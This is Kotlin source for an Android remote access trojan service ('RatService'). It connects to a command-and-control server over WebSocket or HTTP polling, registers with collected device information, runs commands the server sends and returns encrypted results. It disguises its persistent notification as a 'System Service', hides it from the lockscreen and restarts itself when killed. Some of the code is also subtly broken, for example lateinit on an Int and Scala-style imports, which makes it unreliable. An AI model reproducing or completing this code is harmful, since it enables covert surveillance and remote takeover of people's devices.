package com.rat.client.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.rat.client.R
import com.rat.client.command.CommandExecutor
import com.rat.client.crypto.EncryptionUtils
import com.rat.client.util.{DeviceUtils, NetworkUtils, PreferencesManager}
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.net.URI
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean

class RatService : Service() {

    companion object {
        @Suppress("UNUSED_PARAMETER")
        private const val TAG = "RatService"
        private const val NOTIFICATION_ID = 1337
        private const val CHANNEL_ID = "rat_service_channel"
        private var instance: RatService? = null
        fun getInstance(): RatService? = instance
    }

    // C2 Communication
    private var webSocketClient: WebSocketClient? = null
    private val httpClient = NetworkUtils.createHttpClient()
    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private val commandExecutor = CommandExecutor(this)
    private val pendingCommands = ConcurrentHashMap<String, String>()
    private val isConnected = AtomicBoolean(false)
    private val reconnectHandler = Handler(Looper.getMainLooper())
    private var reconnectAttempts = 0
    private val maxReconnectAttempts = 10

    // Configuration
    private lateinit var c2Host: String
    private lateinit var c2Port: Int
    private lateinit var c2Protocol: String
    private lateinit var c2WsUrl: String

    override fun onCreate() {
        super.onCreate()
        instance = this
        initConfig()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        connectToC2()
        Log.d(TAG, "RAT Service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Restart service if killed
        return START_STICKY
    }

    override fun onDestroy() {
        scope.coroutineContext.cancel()
        webSocketClient?.close()
        reconnectHandler.removeCallbacksAndMessages(null)
        instance = null
        super.onDestroy()
        Log.d(TAG, "RAT Service destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        // Restart service when task is removed
        val restartIntent = Intent(this, RatService::class.java)
        restartIntent.setPackage(packageName)
        val pendingIntent = PendingIntent.getService(this, 1, restartIntent, PendingIntent.FLAG_IMMUTABLE)
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
        alarmManager.set(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, pendingIntent)
        super.onTaskRemoved(rootIntent)
    }

    private fun initConfig() {
        c2Host = PreferencesManager.getString("c2_host", BuildConfig.C2_HOST)
        c2Port = PreferencesManager.getInt("c2_port", BuildConfig.C2_PORT)
        c2Protocol = PreferencesManager.getString("c2_protocol", BuildConfig.C2_PROTOCOL)
        c2WsUrl = "${if (c2Protocol == "https") "wss" else "ws"}://$c2Host:$c2Port/ws"
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Background system service"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setShowWhen(false)
            .build()
    }

    private fun connectToC2() {
        scope.launch {
            try {
                // Try WebSocket first
                webSocketClient = WebSocketClient(URI(c2WsUrl)) {
                    onOpen {
                        isConnected.set(true)
                        reconnectAttempts = 0
                        Log.d(TAG, "WebSocket connected to $c2WsUrl")
                        sendRegistration()
                    }
                    onMessage { message ->
                        handleC2Message(message)
                    }
                    onClose { code, reason, remote ->
                        isConnected.set(false)
                        Log.d(TAG, "WebSocket closed: $code - $reason")
                        scheduleReconnect()
                    }
                    onError { ex ->
                        Log.e(TAG, "WebSocket error: ${ex.message}")
                    }
                }
                webSocketClient?.connect()
            } catch (e: Exception) {
                Log.e(TAG, "WebSocket connection failed: ${e.message}")
                scheduleReconnect()
            }
        }
    }

    private fun scheduleReconnect() {
        if (reconnectAttempts < maxReconnectAttempts) {
            reconnectAttempts++
            val delay = minOf(1000L * (1 shl reconnectAttempts), 60000L)
            reconnectHandler.postDelayed({ connectToC2() }, delay)
            Log.d(TAG, "Reconnecting in $delay ms (attempt $reconnectAttempts)")
        } else {
            Log.e(TAG, "Max reconnect attempts reached, falling back to HTTP polling")
            startHttpPolling()
        }
    }

    private fun startHttpPolling() {
        scope.launch {
            while (true) {
                try {
                    pollCommands()
                } catch (e: Exception) {
                    Log.e(TAG, "HTTP polling error: ${e.message}")
                }
                kotlinx.coroutines.delay(30000) // 30 seconds
            }
        }
    }

    private fun pollCommands() {
        val url = "$c2Protocol://$c2Host:$c2Port/api/commands/${DeviceUtils.getDeviceId(this)}"
        val request = NetworkUtils.createRequest(url).get().build()
        httpClient.newCall(request).execute().use { response ->
            if (response.isSuccessful) {
                val body = response.body?.string() ?: return@use
                val commands = gson.fromJson(body, object : TypeToken<List<C2Command>>() {}.type)
                commands?.forEach { cmd -> handleC2Message(cmd.toJson()) }
            }
        }
    }

    private fun sendRegistration() {
        val deviceInfo = DeviceUtils.collectDeviceInfo(this)
        val json = gson.toJson(deviceInfo)
        val encrypted = EncryptionUtils.encrypt(json)
        sendCommand("register", encrypted)
    }

    fun sendCommand(action: String, payload: String) {
        val command = C2Command(
            id = java.util.UUID.randomUUID().toString(),
            action = action,
            payload = payload,
            timestamp = System.currentTimeMillis()
        )
        val json = gson.toJson(command)

        if (isConnected.get() && webSocketClient?.isOpen == true) {
            webSocketClient?.send(json)
        } else {
            // Queue for HTTP fallback
            pendingCommands[command.id] = json
            sendViaHttp(command)
        }
    }

    private fun sendViaHttp(command: C2Command) {
        scope.launch {
            try {
                val url = "$c2Protocol://$c2Host:$c2Port/api/command"
                val json = gson.toJson(command)
                val requestBody = NetworkUtils.createRequestBody(json)
                val request = NetworkUtils.createRequest(url).post(requestBody).build()
                httpClient.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.w(TAG, "HTTP command send failed: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "HTTP send error: ${e.message}")
            }
        }
    }

    private fun handleC2Message(message: String) {
        scope.launch {
            try {
                val command = gson.fromJson(message, C2Command::class.java)
                commandExecutor.execute(command) { result ->
                    val response = C2Command(
                        id = command.id,
                        action = "response",
                        payload = EncryptionUtils.encrypt(result),
                        timestamp = System.currentTimeMillis()
                    )
                    sendCommand("response", gson.toJson(response))
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command handling error: ${e.message}")
            }
        }
    }

    data class C2Command(
        val id: String,
        val action: String,
        val payload: String,
        val timestamp: Long
    ) {
        fun toJson(): String = gson.toJson(this)
    }

    // WebSocket client implementation
    private class WebSocketClient(uri: URI, private val listener: WebSocketListener) :
        org.java_websocket.client.WebSocketClient(uri) {

        override fun onOpen(handshake: org.java_websocket.handshake.ServerHandshake) {
            listener.onOpen()
        }

        override fun onMessage(message: String) {
            listener.onMessage(message)
        }

        override fun onClose(code: Int, reason: String, remote: Boolean) {
            listener.onClose(code, reason, remote)
        }

        override fun onError(ex: Exception) {
            listener.onError(ex)
        }
    }

    private interface WebSocketListener {
        fun onOpen()
        fun onMessage(message: String)
        fun onClose(code: Int, reason: String, remote: Boolean)
        fun onError(ex: Exception)
    }
}